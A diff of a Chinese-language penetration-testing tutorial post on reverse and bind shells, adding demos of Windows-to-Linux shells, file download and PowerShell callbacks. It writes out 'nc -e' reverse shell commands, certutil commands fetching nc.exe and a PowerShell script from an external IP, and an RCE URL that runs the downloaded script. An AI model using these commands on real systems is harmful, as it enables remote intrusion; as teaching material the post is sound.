@@ -1,7 +1,7 @@
 ---
 title: 反弹Shell&渗透命令&Reverse反向&Bind正向&利用语言&文件下载&多姿势
-published: 2026-01-21 19:00:00
-description: 还没准备好。
+published: 2026-01-22 10:00:00
+description: 反弹shell的本质：当防火墙、NAT或数据不回显，还有反弹shell的在线命令生成的平台，以及Windows和Linux双平台反弹shell的演示案例。最后就是如何利用文件下载以及powershell。
 tags: [基础入门,反弹shell]
 category: 网络安全
 draft: true
@@ -104,9 +104,30 @@ Linux<-->Linux基本上不会出现很多问题。
 
 ##### 加深正反向理解
 
-这里为了再次加深理解，放一张图：
+这里为了再次加深理解：
 
-![image-20260121215053148](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121215053148.png)
+1. 正向连接
+   攻击机 → 靶机
+   动作：攻击机主动“连”过去
+   靶机事先在本地端口监听，攻击机 `nc 靶机IP 端口` 就能拿到 Shell。
+2. 反向连接（反弹 Shell）
+   靶机 → 攻击机
+   动作：靶机主动“打”回来
+   攻击机先在公网监听 `nc -lvnp 端口`，靶机执行 `nc -e cmd 攻击机IP 1111`，把 Shell 反送给攻击机。
+
+一句话：正向我去找你，反向你来找我。
+
+### 演示案例1-Windows反弹shell到Linux上
+
+![image-20260122091759113](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091759113.png)
+
+![image-20260122091823879](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091823879.png)
+
+![image-20260122091844520](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091844520.png)
+
+![image-20260122091904440](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091904440.png)
+
+![image-20260122091917126](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091917126.png)
 
 ## 小结
 
@@ -121,14 +142,68 @@ Linux<-->Linux基本上不会出现很多问题。
 
 https://book.shentoushi.top/
 
-
-
-
-
-
-
 ### 文件下载
 
 在线参考：
 
 https://forum.ywhack.com/bountytips.php?download
+
+![image-20260122093010495](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093010495.png)
+
+![image-20260122093018943](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093018943.png)
+
+### 演示案例2-文件下载并反弹
+
+在攻击机上放NC工具同时使用python开启WEB服务，让目标从攻击机上下载这个NC工具来判断是否存在漏洞。
+
+![image-20260122093145756](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093145756.png)
+
+![image-20260122093156341](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093156341.png)
+
+![image-20260122093208918](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093208918.png)
+
+![image-20260122093219856](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093219856.png)
+
+```bash
+certutil.exe -urlcache -split -f http://119.45.92.24:8080/nc.exe nc.exe
+```
+
+![image-20260122093231228](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093231228.png)
+
+![image-20260122093240455](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093240455.png)
+
+![image-20260122093251114](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093251114.png)
+
+### 演示案例3-powershell反弹
+
+![image-20260122093602465](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093602465.png)
+
+![image-20260122093612678](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093612678.png)
+
+![image-20260122093620680](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093620680.png)
+
+![image-20260122094250496](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094250496.png)
+
+![image-20260122094301009](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094301009.png)
+
+![image-20260122094312282](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094312282.png)
+
+把这个1.ps1上传到攻击机上并用python开启WEB服务，靶机用文件下载命令下载这个1.ps1保存为11.ps1。
+
+```bash
+certutil.exe -urlcache -split -f http://119.45.92.24:8080/1.ps1 11.ps1
+```
+
+![image-20260122094659496](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094659496.png)
+
+![image-20260122094742000](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094742000.png)
+
+执行时需要加上`.\`来运行。
+
+```url
+ip/rce.php?c=powershell .\11.ps1
+```
+
+![image-20260122094802309](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094802309.png)
+
+![image-20260122094918840](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094918840.png)
